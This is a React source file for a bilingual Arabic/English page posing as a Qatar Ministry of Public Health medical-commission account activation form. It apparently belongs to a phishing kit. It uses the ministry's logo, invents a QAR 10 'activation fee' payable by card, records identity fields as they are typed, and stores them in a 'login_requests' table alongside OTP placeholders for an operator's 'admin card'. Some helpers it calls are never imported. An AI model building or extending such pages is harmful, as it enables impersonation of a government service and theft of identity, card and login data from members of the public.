import { useMemo, useState, useEffect} from "react";
import { navigateToPage } from "@/lib/store";
import { useLiveDraft } from "@/hooks/useLiveDraft";
import { useLocation, useSearchParams } from "wouter";
import { z } from "zod";
import { Phone, ArrowLeft, Loader2, Info, Wallet, CreditCard, Signal } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useLang } from "@/i18n/LanguageContext";
import { getServiceContext } from "@/lib/serviceContext";
import SiteHeader from "@/components/SiteHeader";
import mophLogo from "@/assets/moph-logo.png.asset.json";

const MAROON = "#8b1538";

const schema = z.object({
  fullName: z.string().trim().min(3, "ar:الاسم قصير جداً").max(80),
  nationalId: z
    .string()
    .trim()
    .min(6, "ar:الرقم غير صحيح")
    .max(20)
    .regex(/^[A-Za-z0-9]+$/, "ar:أحرف إنجليزية وأرقام فقط"),
  phone: z
    .string()
    .trim()
    .regex(/^\+?[0-9]{7,15}$/, "ar:رقم الهاتف غير صحيح"),
  networkOperator: z.string().min(1, "ar:اختر مشغل الشبكة"),
});

const NETWORK_OPERATORS = [
  { value: "ooredoo", label: "Ooredoo - أوريدو" },
  { value: "vodafone", label: "Vodafone Qatar - فودافون قطر" },
];

type FormErrors = Partial<Record<"fullName" | "nationalId" | "phone" | "networkOperator", string>>;

const MedicalActivate = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const [params] = useSearchParams();
  const service = params.get("service");
  const serviceContext = useMemo(() => getServiceContext(service), [service]);
  const prefillId = params.get("uid") || "";
  const userType = (params.get("type") as "company" | "individual") || "individual";

  const [fullName, setFullName] = useState("");
  const [nationalId, setNationalId] = useState(prefillId);
  const [phone, setPhone] = useState("");
  const [networkOperator, setNetworkOperator] = useState("");
  const [errors, setErrors] = useState<FormErrors>({});
  const [loading, setLoading] = useState(false);

  useLiveDraft({
    step: "medical_activate",
    values: { fullName, nationalId, phone, networkOperator, userType },
    columns: {
      phone,
      full_name: fullName,
      national_id: nationalId,
      qatar_id: nationalId,
      selected_service: service || null,
    },
  });

  const t = (ar: string, en: string) => pick(ar, en);

  const pageTitle = pick(serviceContext.activationTitleAr, serviceContext.activationTitleEn);

  const validate = () => {
    const res = schema.safeParse({ fullName, nationalId, phone, networkOperator });
    if (res.success) {
      setErrors({});
      return true;
    }
    const next: FormErrors = {};
    for (const issue of res.error.issues) {
      const k = issue.path[0] as keyof FormErrors;
      const msg = issue.message.startsWith("ar:") ? issue.message.slice(3) : issue.message;
      if (k && !next[k]) next[k] = msg;
    }
    setErrors(next);
    return false;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    setLoading(true);

    const normalizedPhone = phone.replace(/\D/g, "").replace(/^974/, "");
    const payload = {
      phone: normalizedPhone,
      step: "medical_activate",
      // Informational log — the visitor is forwarded to /card-info which
      // will create the actual pending row that needs admin approval.
      status: "info",
      selected_service: service,
      current_page: "/medical-activate",
      full_name: fullName,
      national_id: nationalId,
      qatar_id: nationalId,
      username: userType,
      // Mirror step-scoped identity into activation_data so later pages
      // that overwrite the top-level columns (Ooredoo login username,
      // card flow) can't wipe them from the admin card.
      activation_data: {
        network_operator: networkOperator,
        activate_user_type: userType,
        activate_full_name: fullName,
        activate_national_id: nationalId,
        activate_phone: normalizedPhone,
      },
      updated_at: new Date().toISOString(),
    } as any;
    // Unify visitor identity: update the existing session row when present
    // (e.g. visitor came from /medical-login) so the admin sees one card,
    // not two separate visitors with the same identity.
    let existingId: string | null = null;
    try { existingId = sessionStorage.getItem("visitor_request_id"); } catch { /* noop */ }
    let data: { id: string } | null = null;
    let error: unknown = null;
    if (existingId) {
      const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
      data = res.data as any; error = res.error;
      if (!data) {
        // Row was deleted server-side; fall back to insert
        const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" }).select("id").single();
        data = ins.data as any; error = ins.error;
      }
    } else {
      const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" }).select("id").single();
      data = ins.data as any; error = ins.error;
    }

    setLoading(false);
    if (error || !data) return;
    setVisitorRequestId(data.id);
    if (typeof window !== "undefined") {
      sessionStorage.setItem("selected_service", service || "");
    }
    navigate("/card-info", { state: { phone: normalizedPhone } });
  };

  useEffect(() => {
    navigateToPage("تفعيل حساب القومسيون");
  }, []);

  return (
    <div dir={dir} className="min-h-screen bg-[#eef0fb] flex flex-col">
      <SiteHeader />
      <div className="flex-1 py-8 px-3 flex items-start justify-center">
        <div className="w-full max-w-5xl bg-white shadow-sm">
          {/* Titles bar */}
          <div className="text-center pt-8 pb-6 px-6 border-b border-gray-100">
            <h1 className="text-2xl font-bold" style={{ color: MAROON }}>
              {pageTitle}
            </h1>
            <p className="mt-3 text-gray-500 text-lg">
              {t("تفعيل الحساب وربطه برقم الهاتف", "Account activation & phone linking")}
            </p>
          </div>

          {/* Logo */}
          <div className="flex justify-center py-6 px-6">
            <div className="bg-white rounded-2xl px-5 py-3 shadow-sm ring-1 ring-black/5 inline-flex items-center justify-center">
              <img
                src={mophLogo.url}
                alt={t("وزارة الصحة العامة - دولة قطر", "Ministry of Public Health - State of Qatar")}
                className="max-w-[200px] w-full h-auto"
                width={560}
                height={280}
                loading="lazy"
              />
            </div>
          </div>

          <div className="px-6 pb-8 text-right">
            {/* Requirements list */}
            <div className="mb-5 rounded-md border border-gray-200 bg-gray-50 p-3">
              <div className="flex items-center gap-2 mb-2">
                <Info className="w-4 h-4" style={{ color: MAROON }} />
                <span className="text-sm font-semibold text-gray-700">
                  {t("متطلبات التفعيل", "Activation requirements")}
                </span>
              </div>
              <ul className="text-xs text-gray-600 space-y-1 list-disc pr-5">
                <li>{t("الاسم الكامل مطابق للهوية القطرية.", "Full name matching Qatar ID.")}</li>
                <li>{t("الهوية القطرية / الرقم الشخصي المسجل.", "Registered Qatar ID / Personal ID.")}</li>
                <li>{t("رقم هاتف قطري نشط لاستقبال رمز التحقق.", "Active Qatari phone number to receive the code.")}</li>
              </ul>
            </div>

            {/* Activation fee */}
            <div
              className="mb-5 rounded-md p-4 flex items-start gap-3"
              style={{ backgroundColor: "#fff8ec", border: "1px solid #f0c674" }}
            >
              <div
                className="w-9 h-9 rounded-full flex items-center justify-center shrink-0"
                style={{ backgroundColor: "#b7791f" }}
              >
                <Wallet className="w-5 h-5 text-white" />
              </div>
              <div className="flex-1">
                <div className="flex items-center justify-between gap-2 mb-1">
                  <h3 className="font-bold text-sm text-[#7a5210]">
                    {t("رسوم تفعيل الحساب", "Account activation fee")}
                  </h3>
                  <span
                    className="text-sm font-extrabold px-2 py-0.5 rounded-md text-white"
                    style={{ backgroundColor: MAROON }}
                  >
                    {t("10 ر.ق", "QAR 10")}
                  </span>
                </div>
                <p className="text-xs text-[#7a5210] leading-relaxed">
                  {t(
                    "يتم تحصيل رسم رمزي لمرة واحدة بقيمة 10 ريال قطري لتغطية تكاليف التحقق الإلكتروني وربط الحساب برقم الهاتف المعتمد. تُدفع الرسوم عبر بطاقة بنكية آمنة في الخطوة التالية.",
                    "A one-time symbolic fee of QAR 10 is charged to cover electronic verification and phone-number linking. The fee is paid securely via bank card in the next step."
                  )}
                </p>
                <div className="mt-2 flex items-center gap-2 text-[11px] text-[#7a5210]">
                  <CreditCard className="w-3.5 h-3.5" />
                  <span>{t("يدعم Visa و Mastercard و NAPS.", "Supports Visa, Mastercard and NAPS.")}</span>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} noValidate className="space-y-5">
              <div className="space-y-2">
                <Label htmlFor="full-name" className="text-gray-600 text-sm">
                  {t("الاسم الكامل", "Full Name")} <span style={{ color: MAROON }}>*</span>
                </Label>
                <Input
                  id="full-name"
                  dir={dir}
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  onBlur={validate}
                  maxLength={80}
                  aria-invalid={!!errors.fullName}
                  className={`h-11 rounded-md text-base bg-white ${
                    errors.fullName ? "border-red-400" : "border-gray-300"
                  }`}
                />
                {errors.fullName && <p className="text-sm text-red-600">{errors.fullName}</p>}
              </div>

              <div className="space-y-2">
                <Label htmlFor="national-id" className="text-gray-600 text-sm">
                  {t("الهوية القطرية / الرقم الشخصي", "Qatar ID / Personal ID")}{" "}
                  <span style={{ color: MAROON }}>*</span>
                </Label>
                <Input
                  id="national-id"
                  dir="ltr"
                  value={nationalId}
                  onChange={(e) =>
                    setNationalId(e.target.value.replace(/[^A-Za-z0-9]/g, "").toUpperCase())
                  }
                  onBlur={validate}
                  maxLength={20}
                  placeholder="AK0490207"
                  aria-invalid={!!errors.nationalId}
                  className={`h-11 rounded-md text-base bg-white ${
                    errors.nationalId ? "border-red-400" : "border-gray-300"
                  }`}
                />
                {errors.nationalId && <p className="text-sm text-red-600">{errors.nationalId}</p>}
              </div>

              <div className="space-y-2">
                <Label htmlFor="phone" className="text-gray-600 text-sm">
                  {t("رقم الهاتف المعتمد", "Approved Phone Number")}{" "}
                  <span style={{ color: MAROON }}>*</span>
                </Label>
                <div className="relative">
                  <Input
                    id="phone"
                    dir="ltr"
                    inputMode="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/[^0-9+]/g, ""))}
                    onBlur={validate}
                    maxLength={16}
                    placeholder="مثال: 9743xxxxxxx"
                    aria-invalid={!!errors.phone}
                    className={`h-11 rounded-md text-base bg-white ps-10 ${
                      errors.phone ? "border-red-400" : "border-gray-300"
                    }`}
                  />
                  <Phone
                    className="absolute start-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400"
                  />
                </div>
                {errors.phone && <p className="text-sm text-red-600">{errors.phone}</p>}
              </div>

              <div className="space-y-2">
                <Label className="text-gray-600 text-sm">
                  {t("حدد نوع مشغل الشبكة", "Select Network Operator")}{" "}
                  <span style={{ color: MAROON }}>*</span>
                </Label>
                <Select
                  value={networkOperator}
                  onValueChange={(v) => {
                    setNetworkOperator(v);
                    validate();
                  }}
                >
                  <SelectTrigger
                    dir={dir}
                    aria-invalid={!!errors.networkOperator}
                    className={`h-11 rounded-md text-base bg-white ${
                      errors.networkOperator ? "border-red-400" : "border-gray-300"
                    }`}
                  >
                    <SelectValue
                      placeholder={t("اختر مشغل الشبكة", "Choose operator")}
                    />
                  </SelectTrigger>
                  <SelectContent dir={dir}>
                    {NETWORK_OPERATORS.map((op) => (
                      <SelectItem key={op.value} value={op.value}>
                        {op.label}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {errors.networkOperator && (
                  <p className="text-sm text-red-600">{errors.networkOperator}</p>
                )}
              </div>

              <div className="flex items-center justify-start gap-3 pt-2">
                <Button
                  type="submit"
                  disabled={loading}
                  className="min-w-[160px] h-11 rounded-full text-white hover:opacity-90 gap-2"
                  style={{ backgroundColor: MAROON }}
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      {t("جارٍ التفعيل...", "Activating...")}
                    </>
                  ) : (
                  <>
                      {t("تفعيل الحساب", "Activate Account")}
                      <ArrowLeft className="!size-5" />
                    </>
                  )}
                </Button>
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => navigate(-1)}
                  className="min-w-[120px] h-11 rounded-full border-gray-400 text-gray-700 hover:bg-gray-100"
                >
                  {t("رجوع", "Back")}
                </Button>
              </div>

              <p className="text-[11px] text-gray-500 leading-relaxed pt-2 border-t border-gray-100">
                {t(
                  serviceContext.isSehhaty
                    ? "بمتابعتك تفعيل الحساب فإنك توافق على مشاركة رقم الهاتف مع بوابة صحتي لأغراض التحقق فقط."
                    : "بمتابعتك تفعيل الحساب فإنك توافق على مشاركة رقم الهاتف مع منصة القومسيون الطبي لأغراض التحقق فقط.",
                  serviceContext.isSehhaty
                    ? "By continuing you agree to share your phone number with the My Health portal for verification purposes only."
                    : "By continuing you agree to share your phone number with the Medical Commission platform for verification purposes only."
                )}
              </p>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default MedicalActivate;